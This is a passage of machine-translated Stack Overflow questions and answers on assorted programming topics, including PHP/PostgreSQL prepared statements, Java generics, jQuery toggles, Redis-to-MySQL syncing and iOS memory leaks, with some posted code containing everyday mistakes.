> 时间：2012-08-17T16:08:42.970

```
return static_cast<Crtp&>(*this); 
```

这在运行时没有成本（但您可能希望保护 的构造函数`Base`）。

# php - 如何在 PHP 中制作动态 postgres 准备好的语句

> ID：12009263
> 
> 赞同：0
> 
> 时间：2012-08-17T16:06:01.820
> 
> 标签：php, postgresql, prepared-statement

我正在尝试使用 postgres 在 PHP 中制作一些准备好的语句。

这有点难以解释，所以我将向您展示：

```
$stmt = "SELECT * FROM customer WHERE zip = '$1'";

if(isset($_POST["CITY"])){ 
   $stmt .= "AND city = '$2'";
}

if(isset($_POST["COUNTRY"])){ 
   $stmt .= "AND country = '$3'";
}

$result = pg_prepare("myconnection", "my query", $stmt);

$result1 = pg_execute("myconnection","my query", array("0000","someCity","someCountry")); 
```

对不起，如果某些代码是错误的，但这是一个徒手的例子。我需要的是能够根据某些变量 isset/not-null 使准备好的语句动态化。当语句只需要 1 或者我只需要添加 $1 和 $3 而不是 $2 时，在数组中发布 3 个变量时，它似乎不起作用。我希望你明白。

我这个周末需要使用它，所以我希望有人知道！

先感谢您！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T18:11:46.540

在准备好的语句中，SQL 故意是**静态**的。一旦准备好语句，参数的数量就不能改变。

但是您的代码很容易根据语句提交正确数量的参数。您可以为参数计数器添加一个变量，以及一个动态 php 数组以传递给 pg_execute 而不是硬编码的文字。并且它们将在`if (isset(...))`分支内增加/填充。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T19:19:51.277

拥有 3 个不同的语句（每种情况一个）并根据传递的参数数量执行适用的语句并没有错。例子：

**编辑：我修改了代码以匹配所有情况：**

*   仅指定的 zip
*   邮编+城市
*   邮编+国家
*   邮编+城市+国家

（即使有其他情况，你也会明白这个想法）

```
$stmt = "SELECT * FROM customer WHERE zip = '$1'";

if(isset($_POST["CITY"]) && isset($_POST["COUNTRY"])) { 
   $stmt3 = $stmt . " AND city = '$2'" . " AND country = '$3'";
} elseif(isset($_POST["CITY"])) { 
   $stmt1 = $stmt . " AND city = '$2'";
} elseif(isset($_POST["COUNTRY"])) {
   $stmt2 = $stmt . " AND country = '$2'";
}

if(isset($stmt3)) {
   $result = pg_prepare("myconnection", "my query", $stmt3);
   $result1 = pg_execute("myconnection","my query", array("0000","someCity","someCountry"));
} elseif(isset($stmt2)) {
   $result = pg_prepare("myconnection", "my query", $stmt2);
   $result1 = pg_execute("myconnection","my query", array("0000","someCountry"));
} elseif(isset($stmt1)) {
   $result = pg_prepare("myconnection", "my query", $stmt1);
   $result1 = pg_execute("myconnection","my query", array("0000","someCity"));
} else {
   $result = pg_prepare("myconnection", "my query", $stmt);
   $result1 = pg_execute("myconnection","my query", array("0000"));
} 
```

为了简洁起见，我省略了（就像你一样）所有的错误检查。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-30T16:03:04.517

尽管 Daniel 和 aymeric 都是正确的——两次测试没有意义，也没有使用数字。见下文：

```
$some_vars = array();
$some_vars[":zip"] = $_POST["ZIP"];
$stmt = "SELECT * FROM customer WHERE zip = :zip";

if(isset($_POST["CITY"])){ 
    $some_vars[":city"] = $_POST["CITY"]);
    $stmt .= " AND city = :city";
}

if(isset($_POST["COUNTRY"])){ 
    $some_vars[":country"] = $_POST["COUNTRY"]);
    $stmt .= " AND country = :country";
}

$result = pg_prepare("myconnection", "my query", $stmt);
$result1 = pg_execute("myconnection","my query", $some_vars); 
```

不要忘记消毒等。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-05-30T19:26:35.387

不要进行字符串连接。检查参数是否设置。如果没有将它们设置为空。使用单个查询字符串：

```
$zip = $_POST["zip"];
$city = $_POST["city"];
$country = $_POST["country"];

if (!isset($zip)) $zip = '';
if (!isset($city)) $city = '';
if (!isset($country)) $country = '';

$stmt = "
    select *
    from customer
    where
        (zip = '$1' or '$1' = '')
        and
        (city = '$2' or '$2' = '')
        and
        (country = '$3' or '$3' = '')
";

$result = pg_prepare("myconnection", "my query", $stmt);
$result1 = pg_execute(
        "myconnection",
        "my query",
        array($zip, $city, $country)
        ); 
```

仅当相应参数不是空字符串时，才会强制执行每个条件。

相同的逻辑可以使用空值而不是空那些包含应该选择的空字符串的列。

# java - 在 Java 中，是否可以要求实现接口来覆盖 Object 方法？

> ID：12009264
> 
> 赞同：2
> 
> 时间：2012-08-17T16:06:05.047
> 
> 标签：java, interface, abstract-class

是否可以要求实现接口来覆盖`Object`方法？

例如，如果我有一个通常用作`HashMap`s 中的键的接口，我可能希望要求该接口的所有实现都覆盖`hashCode()`and`equals()`方法。

但是，如果我有以下界面......：

```
public interface MyInterface(){
  @Override
  public int hashCode();

  @Override
  public boolean equals(Object o);
} 
```

...以下实现编译：

```
public class MyImplementation(){
} 
```

它不需要覆盖`hashCode()`或的方法`equals()`，因为它从 继承这些方法`Object`。

一种方法可能是切换到使用抽象类而不是接口：

```
public abstract class MyAbstractClass(){
  @Override
  public abstract int hashCode();

  @Override
  public abstract boolean equals(Object o);
} 
```

然后任何扩展这个抽象类的类都需要重写`hashCode()`and `equals()`：

```
// doesn't compile - requires implementation of hashCode() and equals()
public class MyClass extends MyAbstractClass {
}

// does compile
public class MyClass extends MyAbstractClass {
  @Override
  public int hashCode(){
    // calculate hashcode
  }

  @Override
  public boolean equals(Object o){
    // check equality
  }
} 
```

我的假设是，它们之间的区别在于抽象类是一个`Object`，所以它`Object`在层次结构中低于，所以所有扩展都需要满足抽象类中的合同。然而，接口不是`Object`s，所以不要坐在层次结构中，但是接口的任何实现都必须是`Object`，此时它继承了`Object`方法，因此满足接口“契约”。

但是，回到我最初的问题......有没有办法要求接口的实现来覆盖`Object`方法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T16:19:29.567

仅使用接口无法完成您想要的事情。

通过强制使用抽象基类来执行此操作的另一种（可能更清晰）方法如下：

```
public abstract class MyAbstractClass {
  @Override public final int hashCode() { return hashCodeImpl(); }
  @Override public final boolean equals(Object o) { return equalsImpl(o); }

  protected abstract int hashCodeImpl();
  protected abstract boolean equalsImpl(Object o);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:19:52.640

不，Java 无法表达这种要求。怎么有这样的抽象类？

```
public abstract class MyAbstractClass(){
  @Override
  public int hashCode(){
    return myOverrideHashCode();
  }

  @Override
  public boolean equals(){
    return myOverrideEquals();
  }

  protected abstract int myOverrideHashCode();

  protected abstract booleans myOverrideEquals();
} 
```

# javascript - 修改 JavaScript 以使用 ASCII 字符或图像而不是文本

> ID：12009267
> 
> 赞同：1
> 
> 时间：2012-08-17T16:06:30.820
> 
> 标签：javascript, jquery

我有一个 DIV，单击时会展开或折叠。有一个 + 号表示它展开，它变为一个 - 号表示您可以折叠它。而不是 + 和 - 符号，我想使用向上和向下箭头。

jsfiddle在这里：http: [//jsfiddle.net/9PzRr/](http://jsfiddle.net/9PzRr/)

我将 .text 更改为 .html 并插入向上/向下箭头的 unicode 值来代替 + 和 - 符号，但只会显示向下箭头。我愿意使用图像而不是 ASCII 字符，但我对 Javascript/jQuery 不够熟悉，不知道如何告诉它显示图像而不是文本。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:12:31.517

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head></head>
<body>
    <h4 id="expanderHead" style="cursor:pointer;">
    EXPANDING COLLAPSING DIV <span id="expanderSign">&#x25BC;</span>
    </h4>
    <div id="expanderContent" style="display:none">
        content<br />
        content<br />
        content<br />
        content<br />
        content<br />
    </div>
    </body>
</html>    

$(document).ready(function() {
    $("#expanderHead").click(function() {
        $("#expanderContent").slideToggle();
        if ($("#expanderSign").text() == "▼") {
            $("#expanderSign").html("▲")
        }
        else {
            $("#expanderSign").text("▼")
        }
    });
}); 
```

[http://jsfiddle.net/diode/9PzRr/1/](http://jsfiddle.net/diode/9PzRr/1/)

或者您可以在 javascript 代码中编写以下内容

```
 String.fromCharCode(0x25BC)
 String.fromCharCode(0x25B2) 
```

建议使用 CSS 背景样式并切换它来获取它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:15:40.053

```
$(document).ready(function() {
    $("#expanderHead").click(function() {
        $("#expanderContent").slideToggle();
        if ($("#expanderSign").text() == "\u25BC") {
            $("#expanderSign").html("\u25B2")
        }
        else {
            $("#expanderSign").text("\u25BC")
        }
    });
});​ 
```

# wpf - 动态访问数据模板

> ID：12009268
> 
> 赞同：0
> 
> 时间：2012-08-17T16:06:31.507
> 
> 标签：wpf

我有以下 xaml： animationTemplate 在模板 1 和模板 2 之间切换。

我想通过将动画模板放在资源字典中来使其更可重用，以便多个控件可以使用相同的动画模板。问题是动画模板引用了模板 1 和模板 2，所以如果我将动画模板放入字典中，我会收到错误，因为动画模板找不到模板 1 和模板 2。

```
 <Window.Resources>
    <ResourceDictionary>
        <ResourceDictionary.MergedDictionaries>
            <ResourceDictionary Source="Dictionary1.xaml" />
        </ResourceDictionary.MergedDictionaries>
        <DataTemplate x:Key="template1" />
        <DataTemplate x:Key="template2" />
        <DataTemplate x:Key="animationTemplate" />
    </ResourceDictionary>
</Window.Resources>
<ContentPresenter Content="{Binding}" ContentTemplate="{StaticResource animationTemplate}" /> 
```

除了将所有模板对放入字典并使用 contentTemplateSelector 从中挑选之外，还有更好的方法吗？我宁愿不这样做（即使可能，因为我在模板中有事件处理程序并且我不确定如何删除它们）

# php - 在使用 Silex 框架的 Twig 模板中使用 Javascript 变量

> ID：12009271
> 
> 赞同：16
> 
> 时间：2012-08-17T16:06:49.583
> 
> 标签：php, javascript, jquery, twig, silex

我正在尝试在 Twig 模板内的一些 Javascript 中创建路由，并且需要使用 JS 变量作为路由参数的值。

例子：

```
window.location.href = {{ path('post_display', { 'id': this_is_where_i_need_to_use_the_js_var }) }}; 
```

我正在使用 Silex 框架，但不确定 FOS JS 是否适用于 Silex。不过，我认为不会。

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2012-08-17T17:48:18.820

Twig，因为它是用 编写的`PHP`，所以在服务器上运行，与 javascript 代码完全分开，所以你想要的需要一个解决方法。

首先，生成路线，但使用占位符，然后在必要时将其替换为变量的值：

```
var route = "{{ path('post_display', { 'id': "PLACEHOLDER" }) }}";
window.location = route.replace("PLACEHOLDER", js_variable); 
```

像这样的东西应该适合你。

# ios - iOS AVPlayer 连接丢失后缓慢重新缓冲

> ID：12009277
> 
> 赞同：7
> 
> 时间：2012-08-17T16:07:25.943
> 
> 标签：ios, streaming, buffer, avplayer

我正在使用 AVPlayer 构建一个音乐流媒体应用程序。一切正常，音乐一直在后台播放，等等。我的问题是当我在手机上模拟连接丢失（关闭蜂窝数据，等待流停止然后再切换回来）时，大约需要 2 分钟即使存在 3G 网络（我可以同时上网），应用程序也会填充缓冲区。

一切都在模拟器中工作，但不在设备上。如果我等待 2 分钟，我会收到一个适当的播放通知，然后一切都很好，但重新缓冲应该只有几秒钟。当我通过关闭路由器上的带宽控制来模拟低带宽时没问题，但是当我通过关闭蜂窝数据来模拟运营商更改并将其切换回那么长的时间时。

我在“playbackBufferEmpty”上调用 beginInterruption 并在“playbackLikelyToKeepUp”上调用 endInterruption。主要问题是“playbackLikelyToKeepUp”来得太晚了。

```
- (void)beginInterruption {
self.backgroundTaskIdentifier = [[UIApplication sharedApplication] beginBackgroundTaskWithExpirationHandler:nil];
}

- (void)endInterruptionWithFlags:(NSUInteger)flags {
    [[UIApplication sharedApplication] endBackgroundTask:self.backgroundTaskIdentifier];
    self.backgroundTaskIdentifier = UIBackgroundTaskInvalid;
    if(self.interrupted) [self play];
    self.interrupted = NO;
} 
```

有任何想法吗？我整天都在处理这个问题，用谷歌搜索了所有内容，但我被困住了。提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T10:41:15.253

几个月前我遇到了同样的情况，我的结论是“playbackLikelyToKeepUp 不可靠”。

我的解决方案是手动检查缓冲的 TimeRange。

**仅供参考，我为远程媒体播放制作了一个 AVPlayer 类 - [HysteriaPlayer](https://github.com/StreetVoice/HysteriaPlayer)。** 您可以直接使用它，也可以查找 .m 文件。

希望这可以帮助。

# objective-c - Objective-c - 类关键字

> ID：12009278
> 
> 赞同：4
> 
> 时间：2012-08-17T16:07:28.700
> 
> 标签：objective-c

[我没有在 Objective-c 文件中使用“类”。](https://github.com/cocos2d/cocos2d-iphone/blob/15ed2bc79b74bb13dcd8022d8336a54ede94140c/tests/ZwoptexTest.m)看起来这个开发人员正在混合 c++ 和 Objective-c（我可能错了）。我了解到我们可以用 Objective-c 代码编写 C 函数，但我不确定这个类的概念。

由于我是 Objective-c 的新手，所以如果有人请向我推荐一些我可以学习的教程或书籍，那就太好了。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-17T16:08:51.663

类（带有大写 C）是表示类的 Objective-C 运行时类型，而不是类的实例。

该文档并没有真正提供太多：

> 表示 Objective-C 类的不透明类型。
> 
> `typedef struct objc_class *Class;`
> 
> **宣布于**
> 
> `objc.h`

它最常见的用法可能是检查实例的类。

```
if ( [value isKindOfClass: [NSDictionary class] ) {
    // value is a dictionary
} 
```

你可以这样写：

```
Class dictionaryClass = [NSDictionary class];
if ( [value isKindOfClass: dictionaryClass ) {
    // value is a dictionary
} 
```

# c++ - C++ 编译错误（gcc 4.7）

> ID：12009282
> 
> 赞同：0
> 
> 时间：2012-08-17T16:07:36.717
> 
> 标签：c++, gcc, compilation, g++, gcc4.7

我正在尝试在第 5.9 章 Bjarne Stroustrup The C++ Programming Language 的末尾做 11 个练习。

```
 1 #include <iostream>
  2 #include <string>
  3 #include <vector>
  4 #include <algorithm>
  5 
  6 void print(std::vector<std::string>::const_iterator str) {
  7    std::cout << *str;
  8 }
  9 
 10 int main(void) {
 11    std::vector<std::string> words;
 12    std::string tmp;
 13 
 14    std::cin >> tmp;
 15    while (tmp != "Quit") {
 16       words.push_back(tmp);
 17       std::cin >> tmp;
 18    }
 19 
 20    for_each(words.begin(), words.end(), print);
 21 
 22    return 0;
 23 } 
```

当我取消注释 20 行时，我收到此错误：

```
In file included from /usr/include/c++/4.7/algorithm:63:0,
                 from 5.9.11.cpp:4:
/usr/include/c++/4.7/bits/stl_algo.h: In instantiation of ‘_Funct std::for_each(_IIter, _IIter, _Funct) [with _IIter = __gnu_cxx::__normal_iterator<std::basic_string<char>*, std::vector<std::basic_string<char> > >; _Funct = void (*)(__gnu_cxx::__normal_iterator<const std::basic_string<char>*, std::vector<std::basic_string<char> > >)]’:
5.9.11.cpp:20:44:   required from here
/usr/include/c++/4.7/bits/stl_algo.h:4442:2: error: could not convert ‘__first.__gnu_cxx::__normal_iterator<_Iterator, _Container>::operator*<std::basic_string<char>*, std::vector<std::basic_string<char> > >()’ from ‘std::basic_string<char>’ to ‘__gnu_cxx::__normal_iterator<const std::basic_string<char>*, std::vector<std::basic_string<char> > >’ 
```

编译命令：

```
g++ prog.cpp -o prog -Wall 
```

我做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:09:32.723

回调函数应该采用`std::string`，而不是迭代器。`for_each`传递每个元素本身。因此，您的功能将变为：

```
void print(const std::sting &str) {
    std::cout << str << ' '; //note I separated the words
} 
```

有关固定示例（包括`std::`on`for_each`以及其他一些细微差异），请参阅[此 run](http://ideone.com/4MjDr)。

在 C++11 中（您的编译器可以通过`-std=c++0x`or访问`-std=c++11`），您甚至不必担心`std::for_each`遍历容器，因为 C++11 引入了 ranged-for 循环：

```
for (const std::string &str : words)
    std::cout << str << ' '; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:15:42.800

正如[克里斯](https://stackoverflow.com/users/962089/chris)已经说过的那样，该`print()`函数应该接受一个`const std::string&`. 作为替代方案，您可以使用 lambda 函数：

```
std::for_each(words.begin(),
              words.end(),
              [](const std::string& a_s)
              {
                  std::cout << a_s << "\n";
              }); 
```

添加编译器标志`-std=c++0x`。

# java - Java - 带有列表的泛型

> ID：12009285
> 
> 赞同：2
> 
> 时间：2012-08-17T16:07:43.627
> 
> 标签：java, generics

我为我的缓存编写了一个函数来检索特定对象。这样我就不需要投了。

```
@SuppressWarnings("unchecked")
    public static <T> T inCache(Class<T> obj, String token) {

        Object cacheObj = Cache.get(token);
        if (cacheObj != null) {

            if (obj.isAssignableFrom(cacheObj.getClass())) {
                return (T) cacheObj;
            }
        }
        return null;

    } 
```

我正在这样使用它

```
String s = inCache(String.class, title); 
```

但是现在我的缓存中有一个字符串列表，我不能像这样使用它

```
List<String> ipList = Util.inCache(List<String>.class, title); 
```

问题是`List<String>.class`. 我对java很陌生，我该怎么写？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-17T16:13:20.503

java中有一个概念叫做类型擦除。由于遗留原因，像 List 这样的东西只是一个列表。它不记得它是运行时的字符串列表。你应该只写 List.class。

然后，您可以在迭代时指定 List 中的对象类型。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-17T16:14:24.933

您无法获得 class of `List<String>`，就您而言，唯一的方法是：

```
List<String> ipList = (List<String>)Util.inCache(List.class, title); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T16:24:24.807

你可以试试 ：

```
List<String> ipList = Util.inCache(List.class, title); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-17T16:31:53.443

试试这个-

```
List<String> inList = (List<String>)Test.inCache(List.class, title); 
```

你也可以这样做 -

```
List<String> inList = Test.inCache((Class<? extends List<String>>)List.class, token); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-17T19:03:01.813

只是为了澄清乔的回答（我没有足够的声誉来评论），在运行时 a `List <String>`and`List<Integer>`或任何其他类型之间没有区别`List`，泛型不会在运行时保留。

意思，`List<String>.class`完全一样，`List<Integer>.class`实际上是`List.class`。这是 Java 类型系统的一个弱点。我不熟悉实现您想要的简单方法。

一个代码证明：

```
// It is true that      
    List<String> stringList = new ArrayList<String>(); 
    List<Integer> integerList = new ArrayList<Integer>();                                               
    System.out.println( stringList.getClass() == integerList.getClass()  );

    // And that ... 
    List objectList = new ArrayList();
    System.out.println( stringList.getClass() == objectList.getClass()  );

    //However, the following is false because a different implementation is used ( I wanted a false case)
    List objectLinkedList = new LinkedList();
    System.out.println(  objectLinkedList.getClass() == objectList.getClass() ); 
```

# c# - 如何获取事件以将参数发送到事件处理程序？

> ID：12009288
> 
> 赞同：2
> 
> 时间：2012-08-17T16:07:58.573
> 
> 标签：c#, .net, events, datagridview

如何获取事件以向函数发送参数？所以我可以同时使用 dataGridView1_MouseMove 函数来拥有 dataGridView1 和 dataGridView2 吗？

```
private void dataGridView1_MouseMove(object sender, MouseEventArgs e)
{
    if ((e.Button & MouseButtons.Left) == MouseButtons.Left)
    {
        // If the mouse moves outside the rectangle, start the drag.
        if (dragBoxFromMouseDown != Rectangle.Empty &&
        !dragBoxFromMouseDown.Contains(e.X, e.Y))
        {
            // Proceed with the drag and drop, passing in the list item.                   
            DragDropEffects dropEffect = dataGridView1.DoDragDrop(
                  dataGridView1.Rows[rowIndexFromMouseDown],
                  DragDropEffects.Move);
        }
    }
} 
```

我目前正在使用这个函数以及其他一些函数来允许拖放 dataGridView1 中的行，我如何对 dataGridView2 使用相同的函数？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:10:55.093

> 如何对 dataGridView2 使用相同的功能？

如果你想使用相同的方法，你永远不需要`dataGridView1`直接引用。

相反，将其更改为`sender`用作您的 DataGridView，如下所示：

```
private void dataGridView1_MouseMove(object sender, MouseEventArgs e)
{
    // Use this instead of dataGridView1
    DataGridView dgv = sender as DataGridView;

    if (dgv == null) // Add some checking
    {
        return;
    }

    if ((e.Button & MouseButtons.Left) == MouseButtons.Left)
    {
         //... 
```

完成此操作后，您可以将订阅添加到任意数量的 DataGridView 实例，它们都将使用相同的事件处理程序。

# jquery - 如何使用 JQuery 或 CSS3 创建弹出面板？

> ID：12009290
> 
> 赞同：0
> 
> 时间：2012-08-17T16:08:13.143
> 
> 标签：jquery, css, xhtml

本质上，我希望能够将鼠标悬停在左侧垂直列中的链接上，并在右侧弹出一个面板。这是我要实现的目标的[屏幕截图。](http://flic.kr/p/cTsG9E)同样，当谈到 JQuery 时，我是一个完全的菜鸟，所以如果有一个严格的 css3 方法来做到这一点，我会全神贯注。

[http://flic.kr/p/cTsG9E](http://flic.kr/p/cTsG9E)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T17:17:28.643

还可以查看 jquery 动画以获得简单的跨浏览器动画。

[http://api.jquery.com/animate/](http://api.jquery.com/animate/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:16:51.300

可能有一种方法可以通过 CSS3 过渡来做到这一点。并非所有浏览器都支持这些。

最简单的方法是使用 jQuery。

```
<a id="trigger-link">Hover Over Me</a>
. . . 
<div id="target" style="display: none">I should not be using inline styles</div> 
```

然后在你的 JS 中：

```
$("#trigger-link").hover(function() {
    $("#target").show();
}, function() {
    $("#target").hide();
}); 
```

这是一个非常简单的例子。但这应该是一个很好的起点。

# ruby-on-rails-3 - Time.zone.at 与 Ruby On Rails 3 中的 Time.zone 不同

> ID：12009295
> 
> 赞同：1
> 
> 时间：2012-08-17T16:08:50.633
> 
> 标签：ruby-on-rails-3, ruby-1.9.2

这是我在控制台中所做的事情：

```
1.9.2p290 :018 > Time.zone = 'Brasilia'
 => "Brasilia" 

1.9.2p290 :020 >  Time.zone.now
 => Fri, 17 Aug 2012 13:08:06 BRT -03:00 

1.9.2p290 :021 > Event.last.start_time
 => 2000-01-01 03:45:00 UTC 

1.9.2p290 :022 > Time.zone.at(event.start_time)
 => Sat, 01 Jan 2000 01:45:00 BRST -02:00 
```

为什么最后一句话返回不同的时区？

# mysql - 将redis数据移动到MySQL的更快方法

> ID：12009297
> 
> 赞同：7
> 
> 时间：2012-08-17T16:09:00.490
> 
> 标签：mysql, redis, mysqldump

我们有大型购物和产品交易系统。我们在使用 MySQL 时遇到了很多问题，所以经过几次研发后，我们计划使用 Redis，并开始将 Redis 集成到我们的系统中。在此之前直接访问数据库之后，现在我们已经移动了 Redis 系统

1.  用户购物车详情
2.  关联公司点击跟踪记录
3.  我们有产品交易用户数据。
4.  其他网站统计信息。

我不仅将数据存储在 Redis 系统中，我还编写了 crons，它按时间间隔在 MySQL 数据中移动 Redis 数据。这是我面临的主要问题。波纹管点我正在寻找解决方案

1.  他们还有其他将大数据从 Redis 转储到 MySQL 的方法吗？
2.  Redis 无法将我们的数据存储在文件中，那么是否可以将这些数据直接存储到 MySQL 数据库中？
3.  Redis 是否有任何触发系统使用它可以避免像队列系统这样的 crons？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-17T19:48:24.147

**他们还有其他方式将大数据从 Redis 转储到 MySQL 吗？**

Redis 有可能（使用 bgsave）以非阻塞和一致的方式生成数据转储。

[https://github.com/sripathikrishnan/redis-rdb-tools](https://github.com/sripathikrishnan/redis-rdb-tools)

您可以使用 Sripathi Krishnan 的知名包在 Python 中解析 redis 转储文件 (RDB)，并离线填充 MySQL 实例。或者，您可以将 Redis 转储转换为 JSON 格式，并以您想要填充 MySQL 的任何语言编写脚本。

这个解决方案只有在你想将 Redis 实例的完整数据复制到 MySQL 时才有意义。

**Redis 是否有任何触发系统可以用来避免像队列系统这样的 crons？**

Redis 没有触发器的概念，但没有什么可以阻止您在每次必须将某些内容复制到 MySQL 时在 Redis 队列中发布事件。例如，而不是：

```
# Add an item to a user shopping cart
RPUSH user:<id>:cart <item> 
```

你可以执行：

```
# Add an item to a user shopping cart
MULTI
RPUSH user:<id>:cart <item>
RPUSH cart_to_mysql <id>:<item>
EXEC 
```

MULTI/EXEC 块使其具有原子性和一致性。然后你只需要编写一个等待cart_to_mysql 队列项目的小守护进程（使用BLPOP 命令）。对于每个出队的项目，守护进程必须从 Redis 获取相关数据，并填充 MySQL 实例。

**Redis 无法将我们的数据存储在文件中，那么是否可以将这些数据直接存储到 MySQL 数据库中？**

我不确定我是否理解这里的问题。但是如果你使用上面的方案，Redis 更新和 MySQL 更新之间的延迟会非常有限。因此，如果 Redis 失败，您只会丢失最后的操作（与基于 cron 作业的解决方案相反）。当然，在数据传播中不可能有 100% 的一致性。

# android - android webview：空白页面，SSL错误没有回调

> ID：12009298
> 
> 赞同：3
> 
> 时间：2012-08-17T16:09:03.423
> 
> 标签：android, android-webview

对于我的应用程序，用户输入服务器名称，应用程序应尝试 HTTPS，如果 HTTPS 失败则回退到 HTTP。美好的。

我了解使用`WebViewClient.onReceivedSslError()`来处理 SSL 错误，并且大部分时间都可以正常工作。然而，偶尔，我看到这个方法没有被调用，尽管在日志中看到了这两行，

```
08-17 08:55:33.430: W/chromium(3264): external/chromium/net/http/http_stream_factory_impl_job.cc:865: [0817/085533:WARNING:http_stream_factory_impl_job.cc(865)] Falling back to SSLv3 because host is TLS intolerant: svcstable1.hs.trcint.com:80
08-17 08:55:33.490: E/chromium(3264): external/chromium/net/socket/ssl_client_socket_openssl.cc:780: [0817/085533:ERROR:ssl_client_socket_openssl.cc(780)] handshake failed; returned -1, SSL error code 1, net_error -107 
```

这会偶尔发生。它会连续失败 3 次，然后工作正常，我不能让它再次失败。

此时，我正在考虑自己获取页面内容并将数据设置到 Web 视图中。我宁愿不这样做，但这似乎是我目前唯一的选择。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T23:03:15.107

我一直无法找到原因或解决方案。我最终使用`HttpClient`“测试”连接，然后将其交给`WebView`.

非常痛苦，尤其是当`WebView`有看似强大的错误处理机制时。

# xmpp - 在 xmpp pubsub 项中包含时间戳

> ID：12009303
> 
> 赞同：1
> 
> 时间：2012-08-17T16:09:11.160
> 
> 标签：xmpp, openfire, ejabberd

我阅读了所有这些讨论和邮件列表，这些讨论和邮件列表提出了如何标准化在 pubsub 项目中包含时间戳，但没有答案今天实际上是如何完成的。我是否必须调整我的服务器以包含创建时间戳（因为每个服务器都出于某种原因存储该信息；）或者是否有用于 openfire 或 ejabberd 的插件或已知的源代码修改？

我有以 json 格式而不是 Atom 格式发布的条目。顺便说一句，XEP-0060 中的“已发布”和“更新”时间戳来自哪里？如果我将节点配置为在 Atom 中发布，是否会自动添加时间戳？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T17:10:24.683

您将不得不调整您的服务器，因为时间戳不是规范的一部分。

现在拥有时间戳的唯一方法是将它们放在应用程序级别，这意味着发布者将其插入到有效负载中。

# iphone - libsystem_c.dylib strdup 中的内存泄漏

> ID：12009307
> 
> 赞同：1
> 
> 时间：2012-08-17T16:09:21.067
> 
> 标签：iphone, memory-leaks

当我尝试测试应用程序时，仪器出现内存泄漏。在应用程序中，当我在 UIWebView 中测试 youtube 视频时，它显示 libsystem_c.dylib 中的 malloc 内存泄漏，负责的帧显示是 strdup。

```
-(void)LaunchVideo:(id)sender
{

    self.videoURL = @"http://www.youtube.com/embed/0Xa4bHcJu8";

    //VideoViewController *videoViewController = [[[VideoViewController alloc] initWithNibName:nil bundle:nil] retain];

VideoViewController *videoViewController = [[VideoViewController alloc] init];

    videoViewController.modalTransitionStyle = UIModalTransitionStyleCrossDissolve;
    videoViewController.videoURL = self.videoURL;

    [self presentModalViewController:videoViewController animated:YES];

    [videoViewController release];
} 
```

编辑：

下面是堆栈跟踪：

```
0 libsystem_c.dylib malloc
1 libsystem_c.dylib strdup
2 libnotify.dylib token_table_add
3 libnotify.dylib notify_register_check
4 AVFoundation -[AVPlayer(AVPlayerMultitaskSupport) _iapdExtendedModeIsActive]
6 AVFoundation -[AVQueuePlayer init]
7 MediaPlayer -[MPQueuePlayer init]
23 MediaPlayer -[UIMoviePlayerController setAutoRotationMask:]
24 QuickTime Plugin 0x89473ce
27 QuickTime Plugin 0x894f3bc
28 libdispatch.dylib _dispatch_call_block_and_release
29 libdispatch.dylib _dispatch_main_queue_callback_4CF$VARIANT$mp
30 CoreFoundation __CFRunLoopRun
32 CoreFoundation CFRunLoopRunInMode
33 GraphicsServices GSEventRunModal
34 UIKit UIApplicationMain 
```

任何人都可以说出泄漏的原因和原因。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:19:18.087

尝试谷歌搜索类似的问题？我刚刚做了，我发现了这个：

[iOS libsystem_c.dylib strdup 内存泄漏 NSZombie 不工作](https://stackoverflow.com/questions/5899419/ios-libsystem-c-dylib-strdup-memory-leak-nszombie-not-working)

总而言之，这可能是您不负责的库中的泄漏。如果是这种情况，而且这是一次很小的泄漏，请不要出汗。

# php - 为什么 SplFixedArray 的 json_encode 转储对象而不是数组？

> ID：12009308
> 
> 赞同：1
> 
> 时间：2012-08-17T16:09:26.077
> 
> 标签：php, arrays, json

我`json_encode`用来转储一个数组，使用`array()`and得到不同的结果`SplFixedArray`。它在我使用时`array()`给了我应有的数组，但在我使用`SplFixedArray`. 是否有一个原因？

这是我使用普通数组（）时返回的内容：

```
[{"firstName":"Bo","middleName":"N","lastName":"Higgs"},
 {"firstName":"Bob","middleName":"D","lastName":"Superstar"}] 
```

当我使用 SplFixedArray 时，它给了我：

```
{"0":{"firstName":"Bo","middleName":"N","lastName":"Higgs"},
 "1":{"firstName":"Bob","middleName":"D","lastName":"Superstar"}} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:35:23.803

